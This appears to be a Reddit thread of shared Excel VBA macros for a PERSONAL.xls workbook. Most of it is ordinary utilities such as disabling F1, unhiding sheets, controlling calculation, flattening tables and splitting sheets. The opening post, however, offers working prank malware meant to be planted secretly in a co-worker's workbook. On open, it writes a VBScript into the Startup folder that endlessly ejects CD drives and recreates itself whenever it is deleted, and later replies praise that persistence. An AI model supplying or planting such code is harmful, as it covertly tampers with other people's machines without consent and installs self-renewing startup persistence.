@@ -1,0 +1,334 @@
+Does anyone have a PERSONAL.xls file they would like to share
+*EDIT: If anyone can tell me how to stop the optical drive trying to read when it shuts and just open again straight away I'll love you forever, cause then I could make it go in time to some beep music and the computer would really be going spastic...*  
+  
+So, if you put this in a co-worker's personal.xls they will actually go insane...  Un-comment the last line if you want them to figure the problem out at some point...
+  
+    Private Sub Workbook_Open()
+    Call EssentialFunction()
+    End Sub
+
+    Sub EssentialFunction()
+
+    Dim RunFilePth As String
+    Dim FilePth As String
+    FilePth = "C:\Users\" + Environ("username") + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explorer.vbs"
+
+    Set fs = CreateObject("scripting.filesystemobject")
+    Set a = fs.CreateTextFile(FilePth, True)
+    a.WriteLine ("do" & Chr(13))
+    a.WriteLine ("Dim ts" & Chr(13))
+    a.WriteLine ("Dim strDriveLetter" & Chr(13))
+    a.WriteLine ("Dim intDriveLetter" & Chr(13))
+    a.WriteLine ("Dim fs 'As Scripting.FileSystemObject" & Chr(13))
+    a.WriteLine ("Const CDROM = 4" & Chr(13))
+    a.WriteLine ("On Error Resume Next" & Chr(13))
+    a.WriteLine ("Set fs = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")" & Chr(13))
+    a.WriteLine ("strDriveLetter = " & Chr(34) & Chr(34) & Chr(13))
+    a.WriteLine ("For intDriveLetter = Asc(" & Chr(34) & "A" & Chr(34) & ") To Asc(" & Chr(34) & "Z" & Chr(34) & ")" & Chr(13))
+    a.WriteLine ("Err.Clear" & Chr(13))
+    a.WriteLine ("If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then" & Chr(13))
+    a.WriteLine ("If Err.Number = 0 Then" & Chr(13))
+    a.WriteLine ("strDriveLetter = Chr(intDriveLetter)" & Chr(13))
+    a.WriteLine ("Exit For" & Chr(13))
+    a.WriteLine ("End If" & Chr(13))
+    a.WriteLine ("End If" & Chr(13))
+    a.WriteLine ("Next" & Chr(13))
+    a.WriteLine ("Set oWMP = CreateObject(" & Chr(34) & "WMPlayer.OCX.7" & Chr(34) & ")" & Chr(13))
+    a.WriteLine ("Set colCDROMs = oWMP.cdromCollection" & Chr(13))
+    a.WriteLine ("For d = 0 to colCDROMs.Count - 1" & Chr(13))
+    a.WriteLine ("colCDROMs.Item(d).Eject" & Chr(13))
+    a.WriteLine ("Next 'null" & Chr(13))
+    a.WriteLine ("For d = 0 to colCDROMs.Count - 1" & Chr(13))
+    a.WriteLine ("colCDROMs.Item(d).Eject" & Chr(13))
+    a.WriteLine ("Next 'null" & Chr(13))
+    a.WriteLine ("set owmp = nothing" & Chr(13))
+    a.WriteLine ("set colCDROMs = nothing" & Chr(13))
+    a.WriteLine ("loop" & Chr(13))
+    a.Close
+
+    RunFilePth = "Explorer.exe " & FilePth
+
+    'Call Shell(RunFilePth, 1)
+    
+    End Sub
+
+These are some I have collected from various sources. Not all were done by myself.
+
+**Disable and enable the help button in Excel**
+
+Eliminate the annoying miss-press help dialog. 
+
+    Sub app_HelpDisable()
+        Application.OnKey "{F1}", ""
+    End Sub
+    
+    Sub app_HelpEnable()
+        Application.OnKey "{F1}"
+    End Sub
+
+**Unhide Sheets or Charts or All**
+
+    Sub app_UnhideAllSheets()
+        Dim wsSheet As Worksheet
+    
+        For Each wsSheet In ActiveWorkbook.Worksheets
+            wsSheet.Visible = xlSheetVisible
+        Next wsSheet
+    End Sub
+    
+    Sub app_UnhideAllCharts()
+        Dim wsChart As Chart
+        
+        For Each wsChart In ActiveWorkbook.Charts
+            wsChart.Visible = xlSheetVisible
+        Next wsChart
+    End Sub
+    
+    Sub app_UnhideAll()
+        Dim wsSheet As Worksheet
+        Dim wsChart As Chart
+        
+        For Each wsSheet In ActiveWorkbook.Worksheets
+            wsSheet.Visible = xlSheetVisible
+        Next wsSheet
+    
+        For Each wsChart In ActiveWorkbook.Charts
+            wsChart.Visible = xlSheetVisible
+       Next wsChart
+    End Sub
+
+I can see from /u/gwo's post, un-hide all is unnecessarily long.
+
+**Controlling workbook calculation**
+
+Helps when the sheets become complex and every edit requires a long calculation. Press F9 to re-calculate.
+
+    Sub calc_DisbaleWorksheet()
+        ActiveSheet.EnableCalculation = False
+    End Sub
+    
+    Sub calc_EnableWorksheet()
+        ActiveSheet.EnableCalculation = True
+    End Sub
+    
+    Sub calc_EnableAllWorksheets()
+        Dim wsSheet As Worksheet
+       
+        For Each wsSheet In ActiveWorkbook.Worksheets
+            wsSheet.EnableCalculation = True
+        Next wsSheet
+    End Sub
+    
+    Sub calc_DisableAllWorksheets()
+        Dim wsSheet As Worksheet
+       
+        For Each wsSheet In ActiveWorkbook.Worksheets
+            wsSheet.EnableCalculation = False
+        Next wsSheet
+    End Sub
+    
+    Sub calc_WorkbookManual()
+        Application.Calculation = xlCalculationManual
+    End Sub
+    
+    Sub calc_WorkbookAuto()
+        Application.Calculation = xlCalculationAutomatic
+    End Sub
+
+**Most used**
+
+    Sub quick_PasteSpecialValues()
+        On Error Resume Next
+        Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
+    End Sub
+
+    Sub quick_PasteSpecialFormulas()
+        On Error Resume Next
+        Selection.PasteSpecial Paste:=xlPasteFormulasAndNumberFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
+    End Sub
+
+    Sub quick_CenterAcross()
+        With Selection
+            .HorizontalAlignment = xlCenterAcrossSelection
+        End With
+    End Sub
+
+I use this in every workbook I start:
+
+    Sub names_AddHasFormula()
+        ActiveWorkbook.Names.Add Name:="_has_formula", RefersToR1C1:="=GET.CELL(48,INDIRECT(""rc"",FALSE))"
+    End Sub
+
+Couple the created named range with a conditional format and cells that contain formulas will be highlight
+
+**Flatten 2D Table into 1D**
+
+This has been occasionally useful. Converts a 2D table into a table of data records
+
+    Sub flattetTable()
+    '   Before running this, make sure you have a summary table with column headers.
+    '   The output table will have three columns.
+        Dim SummaryTable As Range, OutputRange As Range
+        Dim OutRow As Long
+        Dim r As Long, c As Long
+
+        On Error Resume Next
+        Set SummaryTable = ActiveCell.CurrentRegion
+        If SummaryTable.Count = 1 Or SummaryTable.Rows.Count < 3 Then
+            MsgBox "Select a cell within the summary table.", vbCritical
+            Exit Sub
+        End If
+        SummaryTable.Select
+        Set OutputRange = Application.InputBox(prompt:="Select a cell for the 3-column output", Type:=8)
+    '   Convert the range
+        OutRow = 2
+        Application.ScreenUpdating = False
+        OutputRange.Range("A1:C3") = Array("Column1", "Column2", "Column3")
+        For r = 2 To SummaryTable.Rows.Count
+            For c = 2 To SummaryTable.Columns.Count
+                OutputRange.Cells(OutRow, 1) = SummaryTable.Cells(r, 1)
+                OutputRange.Cells(OutRow, 2) = SummaryTable.Cells(1, c)
+                OutputRange.Cells(OutRow, 3) = SummaryTable.Cells(r, c)
+                OutputRange.Cells(OutRow, 3).NumberFormat = SummaryTable.Cells(r, c).NumberFormat
+                OutRow = OutRow + 1
+            Next c
+        Next r
+    End Sub
+
+I believe this was taken from [SpreadSheetPage.com](http://spreadsheetpage.com/downloads/xl/makedatabasetable.txt)
+
+
+    Sub UnhideAll()
+
+    Dim WS As Worksheet
+
+        For Each WS In Worksheets
+            WS.Visible = True
+        Next
+
+    End Sub
+
+
+I feel like this one is useful for all and sundry.
+I do a lot of spreadsheets based on, "what were the actual hours or dollars in 2013" and things like that. As a personal preference, I always want the column headers to be the last day of each month and rather than type out, 1/31/14, 2/28/14, etc. I just type the 1/31/14 in A1, then put this is B1 and drag right.
+
+    =DATE(YEAR(A1),MONTH(A1)+2,0)
+
+Not exactly the biggest Excel hack of all time, but when I'm doing a 5-year trend by month it's a pretty big time saver.
+One that I currently have in the works but haven't worked out all the kinks to is creating a function for RANDNAME and RANDWORD that doesn't take any parameters, but simply puts a random first and last name or a random word in the cell. It definitely comes in handy when helping people out on here trying to create fake data. Or really, anytime you want to do a test run on some data, it'd be nice to have quick access to a database of meaningless words and names. I'll be sure to post the code once I finish.
+
+Or, if anyone already has something like this or a simple workaround for it, please let me know!
+I migrated away from a personal workbook, to a an add-in built into the ribbon...can't post all the code (some very work specific), but I'll see what I can dig up.
+
+I wrote some subs to export all my modules to readable text files, so I can integrate into Git.  After some time with other languages (and using an actual professional IDE) I **hate** developing in the VB IDE (but their are some COM add-ins that make life a little bit easier).
+When I figured out how to add custom functions to Excel I was so excited!  I use the COM add-in technique to be able to add buttons to the ribbon for my most used Macros.  Here are two that I have found useful.
+
+**Combine a range of cells with a text separator**
+
+    Function wCombine(rng As Range, Optional delim As String = " ") As String
+        Dim sReturn As String
+        sReturn = ""
+        If Not IsEmpty(rng) Then
+            For Each C In rng.Cells
+                If C <> vbNullString Then
+                    If sReturn = "" Then
+                        'First one
+                        sReturn = C
+                    Else
+                        sReturn = sReturn & delim & C
+                    End If
+                End If
+            Next
+        End If
+        wCombine = sReturn
+    End Function
+
+**Split a worksheet into multiple sheets based on a key column**
+
+For example if you have a sheet with items from multiple stores and you want to have one sheet for each store
+
+    Sub SplitByColumn()
+        
+        Application.ScreenUpdating = False
+        
+        Dim rUniqueValues As Range
+        Dim wsSheet As Worksheet
+        Dim wsSource As Worksheet
+        Dim rCell As Range
+        Dim iKeyColNum As Integer
+        Dim rKeyCol As Range
+        Dim sHelperName As String
+        
+        Set wsSource = ActiveSheet
+        iKeyColNum = ActiveCell.Column
+        Set rKeyCol = ActiveCell.EntireColumn
+        sHelperName = rKeyCol.Cells(1, 1).Value
+        
+        Set wsSheet = Sheets.Add
+        wsSheet.Name = sHelperName
+        
+        Set rUniqueValues = wsSheet.Range("A1")
+        
+        rKeyCol.AdvancedFilter Action:=xlFilterCopy, CopyToRange:=rUniqueValues, Unique:=True
+        
+        With wsSheet
+            Set rUniqueValues = .Range(.Range("A2"), .Range("A100").End(xlUp))
+        End With
+        
+        For Each rCell In rUniqueValues.Cells
+            Set wsSheet = Nothing
+            On Error Resume Next
+            Set wsSheet = Sheets(rCell.Value)
+            On Error GoTo 0
+            If wsSheet Is Nothing Then
+                Set wsSheet = Sheets.Add
+                wsSheet.Name = rCell.Value
+            End If
+            wsSource.Range("A1").AutoFilter Field:=iKeyColNum, Criteria1:=rCell.Value
+            wsSource.AutoFilter.Range.Copy
+            wsSheet.Paste
+            wsSheet.Columns.AutoFit
+        Next rCell
+        
+        wsSource.ShowAllData
+        
+        Application.DisplayAlerts = False
+        Sheets(sHelperName).Delete
+        Application.DisplayAlerts = True
+        
+        Application.ScreenUpdating = True
+    End Sub
+
+Sorry for the lack of comments, I am lazy and terrible.
+
+haha what exactly does this do?  Open and close the drive endlessly?  The code is a bit beyond me.
+Disable the help button - Internet hugs for you.
+So many times I've pressed F2 and accidently touched F1 then had to wait for the help window to open... Can't wait to run that code :-)
+Disable the Help button, thats excellent.
+Eomonth(A1,1)
+Alternatively, you could also use the fill handle to do this which would eliminate the need for any formula. You'd have to provide excel 2 values for it to judge the correct series. 
+
+Using your example, put 1/31/14 in cell A1 and 2/28/14 in cell B1, then select both the cells and left click on the fill handle in the bottom right corner of the selection and drag for as long as you want and it would populate the cells accordingly.
+
+
+Is it necessary to provide the database for your function to select words from?  Or is there a built in that you can reference?  I wonder if you can reference the database that backs up the dictionary, which is probably common across Office products on a given computer, or perhaps built in to the computer OS itself.  
+That's the outcome yes, but the method is that every time you open the personal.xls it creates a vbs script in your start up folder.  
+  
+The vbs script is what opens and shuts the drive, and it only runs on start up, so it can take them ages to figure out it is excel re-creating the file they've deleted like 15 times...
+That's a lot more advanced than I was going for, even though it's probably possible.
+
+I was just planning on reaching out to a simple .txt file that has each name/word separated by line and then just go to a random line each time. Pretty simple, but I think it'd work.
+
+There are plenty of name and word generators online that I can use, but I don't like having to mess with the formats and such. I would just use those once to populate my .txt file and that's all. 
+The file creation part is really the best part.....classic maneuver.  Thanks! 
+What is the purpose of doing this?
+Why not use one of those generators to create a "base" set, copy that data to sheet in your personal workbook (hidden by default, or at least it should be), then write a function to pull from the worksheet?
+The purpose of a PERSONAL.xls file, or are the code u/kieran_n submitted? 
+To mess with people like you.  
+  
+:•)
+Good call. That'd be a lot easier than having to reach out to a .txt file every time.
+The code that "excel re-creating the file they've deleted like 15 times...".  Why would someone want to do this and what purpose does this serve
+So this is like graffiti, only at the office.  Nice.
+office hijinks?
+That's drawing a pretty long bow, but sure, if graffiti was done solely to laugh at the guy scrubbing it off then there would be some similarities...
